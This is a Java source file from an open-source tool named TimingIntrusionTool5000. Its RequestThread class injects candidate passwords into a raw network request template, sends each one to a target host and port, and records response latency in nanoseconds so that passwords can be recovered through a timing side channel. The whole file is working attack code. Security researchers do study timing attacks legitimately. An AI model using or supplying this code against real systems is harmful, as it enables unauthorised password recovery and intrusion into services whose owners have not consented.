package timingattack;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


/**
 *
 * @author aj
 */
public class RequestThread extends Thread {
    
    private final static String PWD_PLACE_HOLDER = "%%PASSWORD%%";     
    private final static String LEN_PLACE_HOLDER = "%%LEN\\{(\\d*)\\}%%";
    private final static String PAD_PLACE_HOLDER = "%%PAD%%";
    
    private final static int PAD_PWD_LENGTH = 14;
    
    private final static ConcurrentHashMap<String, String> requestCache = new ConcurrentHashMap<String, String>(); //reduce GC presure
    
    private final AtomicInteger requestCount;
    private final ArrayBlockingQueue<String> inQueue;
    private final String address;
    private final int port;
    private final HashMap<String, List<Long>> measurements;
    private final String requestTemplate;
    private final Pattern lengthPattern;


    public RequestThread(String address, int port, String requestTemplate, ArrayBlockingQueue<String> inQueue, HashMap<String, List<Long>> measurements, AtomicInteger requestCount) {
        
        this.inQueue = inQueue;
        this.measurements = measurements;
        this.address = address;
        this.port = port;
        this.requestTemplate = requestTemplate;
        this.requestCount = requestCount;
        
        this.lengthPattern = Pattern.compile(LEN_PLACE_HOLDER);
       
    }



    @Override
    public void run() {
        
        while (true) {
            try {
                
                String pwd = inQueue.take();
                
                if (pwd.equals("")) //end condition
                    return;
                
                String req = createRequest(pwd);
                
                long deltaTime = measure(req);
                
                synchronized(measurements) {
                
                    if (!measurements.containsKey(pwd))
                        measurements.put(pwd, new ArrayList<Long>(1000));

                    measurements.get(pwd).add(deltaTime);
                }
                
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
        
    }

    @SuppressWarnings("empty-statement")
    private long measure(String req) {

        

        long deltaTime;
        while (true) { //return until succeed           
            
            Socket sock = null;
            try {
                
                sock = new Socket();
                
                requestCount.incrementAndGet();
                
                SocketAddress sockaddr = new InetSocketAddress(address, port);
                sock.setTcpNoDelay(true);
                sock.setPerformancePreferences(0, 1, 0); //all about the latency
                //sock.setTrafficClass(0x10);
                //sock.setSendBufferSize(req.length());

                sock.connect(sockaddr, 1000);

                OutputStream out = sock.getOutputStream();
                InputStream in = sock.getInputStream();
                
                byte[] outBuff = req.getBytes("ASCII");
                
                out.write(outBuff, 0, req.length());
                out.flush();
                
                long sTime = System.nanoTime();
                
                in.read(); //wait for any response
                
                deltaTime = System.nanoTime() - sTime;

                //read rest to quiet server logs on some systems
                byte[] inBuff = new byte[1024];
                while (in.read(inBuff) > 0);

                break;

            } catch (Exception e) {

                System.err.println("Socket Error Retrying: " + e.toString());

                sleep(1000);
            } finally {
                if (sock != null) {
                    try { 
                        sock.close(); 
                    } catch (IOException e) {
                        System.err.println("Error closing measurement socket.");
                        e.printStackTrace();
                    }
                }
            }

        }

        return deltaTime;

    }
    
    private String createRequest(String pwd) {
        
        if (requestCache.contains(pwd))
            return requestCache.get(pwd);
        
        
        String req = requestTemplate;
        
        //handle length tag, if it's there
        Matcher matcher = lengthPattern.matcher(requestTemplate);
        if (matcher.find()) {
            
            int baseLen = Integer.parseInt(matcher.group(1));
            int newLen = baseLen + pwd.length();
            
            req = matcher.replaceFirst(String.valueOf(newLen));
        }
        
        //insert padding if need be
        int paddingLength = PAD_PWD_LENGTH - pwd.length();
        StringBuilder padding = new StringBuilder();
        for (int i = 0; i < paddingLength; i++)
            padding.append('0');
        req = req.replace(PAD_PLACE_HOLDER, padding);
                
        //insert password into request
        req = req.replace(PWD_PLACE_HOLDER, pwd);
        
        requestCache.put(pwd, req);
        
        return req;
        
    }
    

    private void sleep(int millis) {
        try {

            Thread.sleep(millis);

        } catch (Exception e) {
            throw new RuntimeException("Sleep Fail: " + e.getMessage(), e);
        }
    }

    
    
    public class Measurement {
        
        private String pwd;
        private long time;

        public Measurement(String pwd, long time) {
            this.pwd = pwd;
            this.time = time;
        }

        public String getPwd() {
            return pwd;
        }

        public long getTime() {
            return time;
        }
        
    }
}



/*
 * This file is part of the TimingIntrusionTool5000.
 * 
 * TimingIntrusionTool5000 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * TimingIntrusionTool5000 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
 */
